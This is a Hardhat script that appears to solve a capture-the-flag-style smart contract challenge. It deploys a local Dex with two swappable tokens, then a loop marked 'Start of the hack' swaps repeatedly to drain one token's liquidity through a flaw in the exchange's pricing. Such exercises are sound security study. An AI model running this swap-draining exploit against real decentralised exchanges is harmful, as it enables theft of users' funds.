import { ethers } from "hardhat";

async function dex() {
  let dexAddress = "";
  const myAddress = "0x90F79bf6EB2c4f870365E785982E1f101E93b906";
  // Setup phase
  let dex = null;
  // If we have a DEX address, we attach to it
  if (dexAddress) {
    const Dex = await ethers.getContractFactory("Dex");
    dex = await Dex.attach(dexAddress);

    console.log(
      `Dex attached to ${dex.address} with owner ${await dex.owner()}`
    );
  } else {
    // If we don't have a DEX address, we deploy it
    const Dex = await ethers.getContractFactory("Dex");
    dex = await Dex.deploy();
    await dex.deployed();
    dexAddress = dex.address;

    console.log(
      `Dex deployed to ${dexAddress} with owner ${await dex.owner()}`
    );

    const SwappableToken = await ethers.getContractFactory("SwappableToken");
    const swappableToken1 = await SwappableToken.deploy(
      dex.address,
      "Swappable Token 1",
      "ST1",
      110
    );
    await swappableToken1.deployed();
    const swappableToken2 = await SwappableToken.deploy(
      dex.address,
      "Swappable Token 2",
      "ST2",
      110
    );
    await swappableToken2.deployed();
    console.log(`swappableToken1 deployed to ${swappableToken1.address}`);
    console.log(`swappableToken2 deployed to ${swappableToken2.address}`);

    await dex.setTokens(swappableToken1.address, swappableToken2.address);

    await dex.approve(dex.address, 100);
    await dex.addLiquidity(swappableToken1.address, 100);
    await dex.addLiquidity(swappableToken2.address, 100);

    console.log(
      "Added 100 tokens from each swappable token to the dex from the owner"
    );

    await dex.approve(await dex.owner(), 10);
    await swappableToken1.transferFrom(await dex.owner(), myAddress, 10);
    await swappableToken2.transferFrom(await dex.owner(), myAddress, 10);

    console.log(
      "Transferred 10 tokens from each swappable token to my address"
    );
  }

  // Start of the hack
  const mySigner = await ethers.getSigner(myAddress);
  const token1Address = await dex.token1();
  const token2Address = await dex.token2();

  await dex.connect(mySigner).approve(dexAddress, 110);
  console.log("Approve dex to spend my tokens");

  while (
    (await dex.balanceOf(token1Address, dexAddress)) > 0 &&
    (await dex.balanceOf(token2Address, dexAddress)) > 0
  ) {
    const fromToken =
      (await dex.balanceOf(token1Address, myAddress)) > 0
        ? token1Address
        : token2Address;
    const toToken =
      (await dex.balanceOf(token1Address, myAddress)) > 0
        ? token2Address
        : token1Address;

    const amountToSwap = Math.min(
      await dex.balanceOf(fromToken, myAddress),
      await dex.balanceOf(fromToken, dexAddress)
    );

    await dex.connect(mySigner).swap(fromToken, toToken, amountToSwap);

    console.log(`Swapped ${amountToSwap} tokens`);
    console.log(
      `DEX: ${await dex.balanceOf(
        token1Address,
        dexAddress
      )},${await dex.balanceOf(token2Address, dexAddress)}`
    );
    console.log(
      `ME: ${await dex.balanceOf(
        token1Address,
        myAddress
      )},${await dex.balanceOf(token2Address, myAddress)}`
    );
  }
  console.log("Done");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
dex().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
